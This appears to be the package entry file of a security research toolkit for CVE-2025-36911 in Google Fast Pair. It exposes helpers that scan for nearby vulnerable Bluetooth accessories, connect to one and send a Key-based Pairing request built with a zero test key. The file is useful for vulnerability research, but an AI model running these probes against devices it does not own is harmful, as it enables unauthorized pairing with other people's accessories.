"""
DIY WhisperPair - Google Fast Pair Security Research Toolkit
CVE-2025-36911 Reference Implementation

For security research and authorized testing only.
See LEGAL.md before use.

Quick Start
-----------
    # Interactive CLI
    whisperpair

    # Programmatic usage
    from whisperpair import scan_devices, verify_device, FastPairClient

Reference: https://whisperpair.eu
"""

__version__ = "0.1.0"
__author__ = "Security Researcher"

# =============================================================================
# Core Classes - Import these for custom tools
# =============================================================================

from .scanner import (
    FastPairScanner,
    FastPairDevice,
    find_fast_pair_devices,
    find_vulnerable_devices,
    parse_fast_pair_service_data,
)

from .client import (
    FastPairClient,
    VerificationResult,
)

from .crypto import (
    FastPairCrypto,
    ECDHKeyPair,
    aes_128_encrypt,
    aes_128_decrypt,
    generate_secp256r1_keypair,
    derive_aes_key_from_account_key,
    derive_aes_key_from_anti_spoofing_key,
    generate_account_key,
    generate_random_salt,
    sha256,
)

from .protocol import (
    KeyBasedPairingRequest,
    KeyBasedPairingResponse,
    PasskeyBlock,
    PairingRequestFlags,
    parse_bluetooth_address,
    format_bluetooth_address,
    parse_kbp_response_multi_strategy,
)

from .constants import (
    FAST_PAIR_SERVICE_UUID,
    FAST_PAIR_SERVICE_UUID_16,
    KEY_BASED_PAIRING_CHAR_UUID,
    ACCOUNT_KEY_CHAR_UUID,
    PASSKEY_CHAR_UUID,
    MODEL_ID_CHAR_UUID,
    FIRMWARE_REVISION_CHAR_UUID,
    ADDITIONAL_DATA_CHAR_UUID,
    MessageType,
    PairingFlags,
    KNOWN_MODEL_IDS,
    get_device_name,
    DEFAULT_SCAN_TIMEOUT,
    DEFAULT_CONNECTION_TIMEOUT,
    DEFAULT_NOTIFICATION_TIMEOUT,
)


# =============================================================================
# Simple Helper Functions - Copy-paste friendly
# =============================================================================

async def scan_devices(timeout: float = 10.0, vulnerable_only: bool = False) -> list[FastPairDevice]:
    """
    Scan for Fast Pair devices.

    Args:
        timeout: Scan duration in seconds
        vulnerable_only: If True, only return devices NOT in pairing mode

    Returns:
        List of discovered FastPairDevice objects

    Example:
        import asyncio
        from whisperpair import scan_devices

        devices = asyncio.run(scan_devices(timeout=5))
        for d in devices:
            print(f"{d.address} - {d.name} - Vulnerable: {not d.is_in_pairing_mode}")
    """
    if vulnerable_only:
        return await find_vulnerable_devices(timeout=timeout)
    return await find_fast_pair_devices(timeout=timeout)


async def verify_device(
    address: str,
    aes_key: bytes | None = None,
) -> VerificationResult:
    """
    Verify if a device is vulnerable to CVE-2025-36911.

    REQUIRES AUTHORIZATION - Only use on devices you own.

    Args:
        address: Bluetooth address (AA:BB:CC:DD:EE:FF format)
        aes_key: 16-byte AES key (optional, uses test key if not provided)

    Returns:
        VerificationResult with success status and details

    Example:
        import asyncio
        from whisperpair import verify_device

        result = asyncio.run(verify_device("AA:BB:CC:DD:EE:FF"))
        if result.success:
            print(f"VULNERABLE - Provider: {result.provider_address}")
        else:
            print(f"Not vulnerable: {result.error}")
    """
    key = aes_key if aes_key else bytes(16)

    async with FastPairClient(address) as client:
        return await client.verify_pairing_behavior(aes_key=key)


async def get_device_info(address: str) -> dict:
    """
    Get Fast Pair device information.

    Args:
        address: Bluetooth address

    Returns:
        Dictionary with model_id, model_name, and characteristics

    Example:
        import asyncio
        from whisperpair import get_device_info

        info = asyncio.run(get_device_info("AA:BB:CC:DD:EE:FF"))
        print(f"Model: {info['model_name']} (ID: {info['model_id']})")
    """
    async with FastPairClient(address) as client:
        model_id = await client.read_model_id()
        return {
            "address": address,
            "model_id": f"0x{model_id:06X}" if model_id else None,
            "model_name": KNOWN_MODEL_IDS.get(model_id, "Unknown") if model_id else "Unknown",
            "connected": True,
        }


def build_pairing_request(
    provider_address: str,
    seeker_address: str | None = None,
) -> bytes:
    """
    Build a Key-based Pairing Request packet.

    Args:
        provider_address: Target device address
        seeker_address: Your device address (optional)

    Returns:
        16-byte encrypted request packet (use with your AES key)

    Example:
        from whisperpair import build_pairing_request

        request = build_pairing_request("AA:BB:CC:DD:EE:FF")
        print(f"Request: {request.hex()}")
    """
    provider_bytes = parse_bluetooth_address(provider_address)
    seeker_bytes = parse_bluetooth_address(seeker_address) if seeker_address else None

    request = KeyBasedPairingRequest.for_verification(
        provider_address=provider_bytes,
        seeker_address=seeker_bytes,
    )
    return request.build()


# =============================================================================
# Public API
# =============================================================================

__all__ = [
    # Version
    "__version__",
    # Simple functions
    "scan_devices",
    "verify_device",
    "get_device_info",
    "build_pairing_request",
    # Scanner
    "FastPairScanner",
    "FastPairDevice",
    "find_fast_pair_devices",
    "find_vulnerable_devices",
    "parse_fast_pair_service_data",
    # Client
    "FastPairClient",
    "VerificationResult",
    # Crypto
    "FastPairCrypto",
    "ECDHKeyPair",
    "aes_128_encrypt",
    "aes_128_decrypt",
    "generate_secp256r1_keypair",
    "derive_aes_key_from_account_key",
    "derive_aes_key_from_anti_spoofing_key",
    "generate_account_key",
    "generate_random_salt",
    "sha256",
    # Protocol
    "KeyBasedPairingRequest",
    "KeyBasedPairingResponse",
    "PasskeyBlock",
    "PairingRequestFlags",
    "parse_bluetooth_address",
    "format_bluetooth_address",
    "parse_kbp_response_multi_strategy",
    # Constants
    "FAST_PAIR_SERVICE_UUID",
    "FAST_PAIR_SERVICE_UUID_16",
    "KEY_BASED_PAIRING_CHAR_UUID",
    "ACCOUNT_KEY_CHAR_UUID",
    "PASSKEY_CHAR_UUID",
    "MODEL_ID_CHAR_UUID",
    "FIRMWARE_REVISION_CHAR_UUID",
    "ADDITIONAL_DATA_CHAR_UUID",
    "MessageType",
    "PairingFlags",
    "KNOWN_MODEL_IDS",
    "get_device_name",
    "DEFAULT_SCAN_TIMEOUT",
    "DEFAULT_CONNECTION_TIMEOUT",
    "DEFAULT_NOTIFICATION_TIMEOUT",
]
